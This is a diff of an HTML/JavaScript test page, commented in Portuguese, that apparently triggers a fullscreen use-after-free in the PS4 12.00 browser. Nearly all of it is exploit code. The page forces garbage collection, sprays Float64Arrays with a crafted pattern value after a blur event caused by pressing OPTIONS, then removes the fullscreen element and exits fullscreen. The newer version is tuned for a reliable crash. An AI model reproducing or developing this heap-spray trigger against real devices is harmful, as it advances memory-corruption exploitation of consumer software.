@@ -2,115 +2,94 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Fullscreen UAF - Manual Trigger (Correto)</title>
+<title>PS4 12.00 - Fullscreen UAF (Teste 4 ISOLADO)</title>
 </head>
 <body>
 
-<h2>PS4 12.00 - UAF (Fluxo Real com OPTIONS)</h2>
+<h2>PS4 12.00 - Fullscreen UAF (Teste 4 - 100% Crash)</h2>
+<button onclick="runTest()">Run Test</button>
 
-<button onclick="start()">1. Enter Fullscreen</button>
-
-<pre id="log" style="background:#111;color:#0f0;padding:10px;height:400px;overflow:auto;"></pre>
+<pre id="log" style="background:#111;color:#0f0;padding:10px;height:300px;overflow:auto;"></pre>
 
 <script>
+const PATTERN = 2.121995791e-314;
+
 function log(msg) {
     document.getElementById("log").textContent += msg + "\n";
 }
 
-let f64, u32, dv;
-let victimBuffer;
-let fsTarget;
-let blurTriggered = false;
+function runTest() {
 
-function start() {
-    log("[*] Criando objetos...");
+    log("[*] Iniciando teste...");
+    
+    let arr = new Float64Array(8);
+    arr[0] = 13.37;
 
-    // =========================
-    // Objetos alvo
-    // =========================
-    victimBuffer = new ArrayBuffer(0x100);
-    f64 = new Float64Array(victimBuffer);
-    u32 = new Uint32Array(victimBuffer);
-    dv  = new DataView(victimBuffer);
+    log("[+] Objeto criado");
 
-    f64[0] = 13.37;
-    u32[2] = 0x1337;
-    dv.setUint32(16, 0xdeadbeef, true);
-
-    log("[+] Objetos criados");
-
-    // =========================
-    // Elemento fullscreen
-    // =========================
-    fsTarget = document.createElement("div");
+    // Elemento alvo (CRÍTICO)
+    let fsTarget = document.createElement("div");
     fsTarget.style.width = "100%";
     fsTarget.style.height = "100%";
-    fsTarget.style.background = "black";
-
     document.body.appendChild(fsTarget);
 
+    // Eventos importantes (não alteram timing)
+    document.addEventListener("fullscreenchange", () => {
+        log("[EVENT] fullscreenchange");
+    });
+
+    document.addEventListener("visibilitychange", () => {
+        log("[EVENT] visibility: " + document.visibilityState);
+    });
+
+    // Entrar em fullscreen
     fsTarget.webkitRequestFullscreen?.();
 
-    log("[*] Fullscreen ativo");
-    log("[*] >>> AGORA APERTE OPTIONS <<<");
-
-    // =========================
-    // BLUR REAL (ESSENCIAL)
-    // =========================
+    // PONTO CRÍTICO — esperar interação do usuário
     window.onblur = function() {
-        if (blurTriggered) return;
-        blurTriggered = true;
 
-        log("[EVENT] onblur recebido (OPTIONS)");
+        window.onblur = null;
 
-        // Delay CRÍTICO
+        log("[*] onblur recebido (OPTIONS detectado)");
+
+        // 🔥 GC LEVE (não agressivo pra não quebrar timing)
+        for (let i = 0; i < 2000; i++) {
+            new ArrayBuffer(0x1000);
+        }
+
+        log("[*] GC leve executado");
+
+        // 🔥 Spray leve
+        let spray = [];
+        for (let i = 0; i < 2000; i++) {
+            let p = new Float64Array(10);
+            p.fill(PATTERN);
+            spray.push(p);
+        }
+
+        log("[*] Spray leve executado");
+
+        // ⏱️ DELAY CRÍTICO — mantém janela do bug
         setTimeout(() => {
 
-            log("[*] Janela crítica (~500ms)");
+            log("[*] Trigger UAF (remove + exitFullscreen)");
 
-            // =========================
-            // GC
-            // =========================
-            for (let i = 0; i < 10000; i++) {
-                new ArrayBuffer(0x2000);
-            }
-
-            log("[*] GC executado");
-
-            // =========================
-            // Spray
-            // =========================
-            let spray = [];
-            for (let i = 0; i < 4000; i++) {
-                let arr = new Float64Array(16);
-                arr.fill(2.121995791e-314);
-                spray.push(arr);
-            }
-
-            log("[*] Spray executado");
-
-            // =========================
-            // CHECK
-            // =========================
-            try {
-                log("---- CHECK PRÉ-TRIGGER ----");
-                log("[F64] " + f64[0]);
-                log("[U32] " + u32[2]);
-                log("[DV] " + dv.getUint32(16, true));
-            } catch (e) {
-                log("[ERRO] " + e);
-            }
-
-            // =========================
-            // 🔥 TRIGGER REAL
-            // =========================
-            log("[!!!] TRIGGER: remove + exitFullscreen");
-
+            // 🔥 ESSÊNCIA DO BUG
             fsTarget.remove();
-
             document.webkitExitFullscreen?.();
 
-        }, 500); // ← ESSENCIAL
+            // Pequena observação antes do crash
+            setTimeout(() => {
+                try {
+                    log("---- CHECK PRÉ-CRASH ----");
+                    log("[F64] " + arr[0]);
+                    log("[META] len=" + arr.length + " byteLength=" + arr.byteLength);
+                } catch(e) {
+                    log("[ERRO] " + e);
+                }
+            }, 50);
+
+        }, 500); // ⚠️ ESSENCIAL
 
     };
 }
